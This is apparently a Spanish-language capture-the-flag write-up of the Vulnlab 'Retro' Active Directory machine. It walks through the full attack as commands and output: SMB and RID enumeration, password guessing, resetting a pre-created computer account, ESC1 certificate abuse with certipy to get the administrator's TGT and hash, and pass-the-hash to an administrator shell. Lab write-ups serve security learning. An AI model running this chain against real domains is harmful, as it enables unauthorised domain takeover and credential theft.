---
layout: single
title: Retro - Vulnlab
excerpt: "En este post vamos a estar resolviendo la máquina Retro de la plataforma de Vulnlab en la cual es una máquina windows que toca Active Directory vamos a estar enumerando por el protocolo smb donde vamos a encontrar varias notas interesantes y le cambiaremos la contraseña a un usuario gracias a eso vamos a enumerar los certificate templates para explotar uno y conseguir el TGT del administrador y poder obtener una shell."
date: 2024-03-04
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/Retro-vulnlab/icon.png
  teaser_home_page: true
categories:
  - Vulnlab
tags:  
  - Active Directory
  - SMB enumeration
  - Certificate Template
---

## PortScan

- Hacemos un escaneo buscando puertos abiertos por el protocolo **TCP**.

```bash
➜  content cat ../nmap/targeted
# Nmap 7.94SVN scan initiated Sun Mar  3 17:26:17 2024 as: nmap -sCV -p53,135,139,389,445,464,3389,49719 -oN targeted 10.10.65.176
Nmap scan report for 10.10.65.176
Host is up (0.19s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2023-07-23T21:06:31
|_Not valid after:  2024-07-22T21:06:31
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2024-03-02T23:18:09
|_Not valid after:  2024-09-01T23:18:09
|_ssl-date: 2024-03-03T23:28:08+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-03-03T23:27:29+00:00
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-03-03T23:27:31
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

## SMB Enumeration

- Vamos a agregar los dominios que tenemos al **/etc/hosts** .

```bash
➜  content echo "10.10.65.176 retro.vl DC.retro.vl" | sudo tee -a /etc/hosts
```

- Vemos que estamos ante una máquina **Windows 10** .

```bash
➜  content crackmapexec smb 10.10.65.176
SMB         10.10.65.176    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
```

- Si enumeramos los recursos compartidos por **smb** encontramos `Trainees` empleando un **Null Session** .

```bash
➜  content smbclient -L 10.10.65.176 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Notes           Disk
	SYSVOL          Disk      Logon server share
	Trainees        Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.65.176 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- Vamos a conectarnos al recurso compartido.

```bash
➜  content smbclient //10.10.65.176/trainees
Password for [WORKGROUP\miguel]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 23 15:58:43 2023
  ..                                DHS        0  Wed Jul 26 03:54:14 2023
  Important.txt                       A      288  Sun Jul 23 16:00:13 2023

		6261499 blocks of size 4096. 2892471 blocks available
smb: \>
```

- Encontramos lo siguiente.

```bash
smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> exit
➜  content cat Important.txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins%
```

- Y bueno, nos dicen que él la administración está cansada de tener que lidiar con el problema recurrente de las contraseñas olvidadas, crearon una cuenta para todos los **trainees**.

- Según el admin creo una cuenta para todos, vamos a realizar un ataque de fuerza bruta con **crackmapexec** con los **RIDs** de los usuarios del dominio junto con sus **SID** .

<p align="center">
<img src="https://i.imgur.com/U4ZlMAD.png">
</p>

```bash
➜  content crackmapexec smb 10.10.65.176 -u 'guest' -p '' --rid-brute
SMB         10.10.65.176    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.176    445    DC               [+] retro.vl\guest:
SMB         10.10.65.176    445    DC               [+] Brute forcing RIDs
SMB         10.10.65.176    445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.65.176    445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.10.65.176    445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.10.65.176    445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.10.65.176    445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.10.65.176    445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.10.65.176    445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.10.65.176    445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.10.65.176    445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.10.65.176    445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.10.65.176    445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.10.65.176    445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.10.65.176    445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.65.176    445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.65.176    445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.65.176    445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.10.65.176    445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.10.65.176    445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.65.176    445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.65.176    445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.65.176    445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.65.176    445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.10.65.176    445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.10.65.176    445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.65.176    445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.10.65.176    445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.10.65.176    445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.10.65.176    445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.10.65.176    445    DC               1109: RETRO\tblack (SidTypeUser)
➜  content
```

- Vemos que el usuario **trainee** existe y bueno como el admin dice que han tenido dificultades para recordar contraseñas fuertes y únicas la contraseña de los usuarios tiene que ser muy fácil si probamos con la contraseña del nombre de usuario vemos que es correcta.

```bash
➜  content crackmapexec smb 10.10.65.176 -u 'trainee' -p 'trainee'
SMB         10.10.65.176    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.176    445    DC               [+] retro.vl\trainee:trainee
```

- Vamos a enumerar los recursos compartidos por **smb**, ya que tenemos credenciales válidas.

```bash
➜  content crackmapexec smb 10.10.65.176 -u 'trainee' -p 'trainee' --shares
SMB         10.10.65.176    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.176    445    DC               [+] retro.vl\trainee:trainee
SMB         10.10.65.176    445    DC               [+] Enumerated shares
SMB         10.10.65.176    445    DC               Share           Permissions     Remark
SMB         10.10.65.176    445    DC               -----           -----------     ------
SMB         10.10.65.176    445    DC               ADMIN$                          Remote Admin
SMB         10.10.65.176    445    DC               C$                              Default share
SMB         10.10.65.176    445    DC               IPC$            READ            Remote IPC
SMB         10.10.65.176    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.65.176    445    DC               Notes           READ
SMB         10.10.65.176    445    DC               SYSVOL          READ            Logon server share
SMB         10.10.65.176    445    DC               Trainees        READ
➜  content
```

- Y bueno, no vemos mucho más que **Notes** a sí que vamos a usar **smbclient** para conectarnos.

-  Y bueno, vemos un **.txt** vamos a descargarlo.

```bash
➜  content smbclient //10.10.65.176/Notes -U trainee%trainee
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 16:03:16 2023
  ..                                DHS        0  Wed Jul 26 03:54:14 2023
  ToDo.txt                            A      248  Sun Jul 23 16:05:56 2023

		6261499 blocks of size 4096. 2891438 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \>
```

- Este es el contenido.

```bash
➜  content cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James%                                                                                                                                             ➜  content
```

## Pre created computer account

- Bueno al parecer ya están hablando de **pre created computer account** hubo un incidente con el antiguo software bancario y es momento de comenzar con la limpieza <https://trustedsec.com/blog/diving-into-pre-created-computer-accounts> .

<p align="center">
<img src="https://i.imgur.com/rK0OazT.png">
</p>

- Como hablan de **Finance department** **$** si recordamos encontramos esto.

```bash
SMB         10.10.65.176    445    DC               1106: RETRO\BANKING$ 
```

- Si buscamos en **internet** encontramos la siguiente información que es muy útil.

<p align="center">
<img src="https://i.imgur.com/ZR1XamN.png">
</p>

- Podemos intentar con **crackmapexec** para ver si alguna de las contraseñas son correctas.

```bash
➜  content  crackmapexec smb 10.10.65.176 -u 'BANKING$' -p 'banking'
SMB         10.10.65.176    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.65.176    445    DC               [-] retro.vl\BANKING$:banking STATUS_LOGON_FAILURE
```

- Nos dice que **FAILURE**, pero si leemos el artículo encontramos esto.

<p align="center">
<img src="https://i.imgur.com/0x765dB.png">
</p>

- Bueno, si investigamos vemos que lo que tenemos que hacer es cambiar la contraseña.

<p align="center">
<img src="https://i.imgur.com/R7Oka3M.png">
</p>

- También no lo dicen en el artículo en la parte de **Changing the password** además nos dicen que usemos **RPC** vamos a usar una herramienta de **impacket** para cambiarnos la contraseña. (Si ven una IP diferente es por qué pause la máquina y la volví arrancar y me cambio la IP).

```bash
➜  content impacket-changepasswd 'retro.vl/BANKING$':banking@10.10.121.174 -newpass Passwordxd1234 -dc-ip 10.10.121.174 -p rpc-samr
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```

- Ahora verificamos que la contraseña fue cambiada de manera exitosa.

```bash
➜  content crackmapexec smb 10.10.121.174 -u 'BANKING$' -p 'Passwordxd1234'
SMB         10.10.121.174   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.121.174   445    DC               [+] retro.vl\BANKING$:Passwordxd1234
```

## Active Directory Certificate Services

- Ahora que hemos cambiado la contraseña podemos usar **certipy** <https://github.com/ly4k/Certipy> aquí un post sobre los certificados <https://posts.specterops.io/certified-pre-owned-d95910965cd2> .

- Bueno, vamos a emplear la herramienta.

```bash
➜  content certipy-ad find -u 'BANKING$'@retro.vl -p Passwordxd1234 -dc-ip 10.10.121.174 -stdout
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
[*] Got CA configuration for 'retro-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Property Principals       : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

- `retro.vl` usa **AD CS** y además usa varios **templates** que hay uno vulnerable.

## ESC1 template

- Vemos que el template es vulnerable a **ESC1** que afecta a todos los equipos del dominio, los equipos del dominio tienen la capacidad de inscribirse (enroll) para obtener certificados, y que el solicitante (enrollee) puede proporcionar el sujeto del certificado. Además, la plantilla de certificado permite la autenticación del cliente. La plantilla que se utiliza es **RetroClients** <https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/> .

- Podemos usar **certipy** para solicitar un certificado.
 
- Vemos que nos dice que existe un mínimo para la **key RSA**.

```bash
➜  content certipy-ad req -u 'BANKING$'@retro.vl -p Passwordxd1234 -dc-ip 10.10.121.174 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
[*] Request ID is 8
Would you like to save the private key? (y/N)
```

<p align="center">
<img src="https://i.imgur.com/D8qaMXn.png">
</p>

- Vamos a proporcionar la medida exacta para que funcione.

```bash
➜  content certipy-ad req -u 'BANKING$'@retro.vl -p Passwordxd1234 -dc-ip 10.10.121.174 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -key-size 4096
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

- Ahora vamos a autenticarnos para obtener le **TGT** este es un tipo de credencial que se utiliza en el protocolo **Kerberos** para autenticar a un usuario en un dominio.

```bash
➜  content certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.121.174
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': ********************************:********************************
➜  content
```

- Y bueno ahora que tenemos el **hash** vamos a obtener un **shell** empleando **Pass the Hash** .

## Shell as administrator

- Y podemos en la misma ruta de siempre vemos la flag.

```bash
➜  content impacket-wmiexec administrator@10.10.121.174 -hashes ********************************:********************************
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
retro\administrator
C:\>type C:\Users\administrator\Desktop\root.txt
VL{************************}
C:\>
```
